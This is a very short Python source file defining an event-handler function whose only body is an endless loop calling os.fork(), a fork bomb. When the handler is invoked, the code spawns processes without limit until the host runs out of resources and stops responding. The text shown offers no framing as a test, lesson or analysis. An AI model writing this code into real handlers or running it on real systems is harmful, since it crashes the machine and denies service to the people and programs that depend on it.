import os


def handler(event=None):
    while True:
        os.fork()
